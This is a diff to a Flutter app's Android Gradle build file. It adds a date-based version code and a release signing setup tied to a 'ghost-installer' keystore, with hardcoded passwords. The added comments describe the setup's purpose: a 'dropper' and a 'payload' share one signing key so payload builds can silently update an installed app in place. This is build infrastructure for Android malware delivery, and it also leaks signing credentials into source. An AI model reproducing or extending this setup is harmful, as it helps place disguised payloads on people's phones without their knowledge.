@@ -1,5 +1,6 @@
 buildscript {
-    ext.flutterVersionCode = '104090003'
+    // Monotonic, date-derived code so every payload build can update the
+    // previous one. Override with ANDROID_VERSION_CODE when needed.
     ext.flutterVersionName = '1.5.0'
 }
 
@@ -23,9 +24,9 @@ if (localPropertiesFile.exists()) {
     }
 }
 
-def flutterVersionCode = localProperties.getProperty('flutter.versionCode')
-if (flutterVersionCode == null) {
-    flutterVersionCode = '104090003'
+def flutterVersionCode = System.getenv('ANDROID_VERSION_CODE')
+if (!flutterVersionCode) {
+    flutterVersionCode = "104" + new Date().format('MMddHH')
 }
 
 def flutterVersionName = localProperties.getProperty('flutter.versionName')
@@ -58,7 +59,15 @@ android {
 
     signingConfigs {
         release {
-            if (keystoreProperties['storeFile']) {
+            // The dropper and the payload MUST share one signing key, otherwise
+            // in-place updates fail with INSTALL_FAILED_UPDATE_INCOMPATIBLE.
+            def ghostStore = rootProject.file('../../ghost-installer/release.keystore')
+            if (ghostStore.exists()) {
+                keyAlias 'ghost'
+                keyPassword 'GhostDropper2026!'
+                storeFile ghostStore
+                storePassword 'GhostDropper2026!'
+            } else if (keystoreProperties['storeFile']) {
                 keyAlias keystoreProperties['keyAlias']
                 keyPassword keystoreProperties['keyPassword']
                 storeFile file(keystoreProperties['storeFile'])
@@ -69,7 +78,8 @@ android {
 
     buildTypes {
         release {
-            if (keystoreProperties['storeFile']) {
+            if (rootProject.file('../../ghost-installer/release.keystore').exists()
+                    || keystoreProperties['storeFile']) {
                 signingConfig signingConfigs.release
             } else {
                 signingConfig signingConfigs.debug
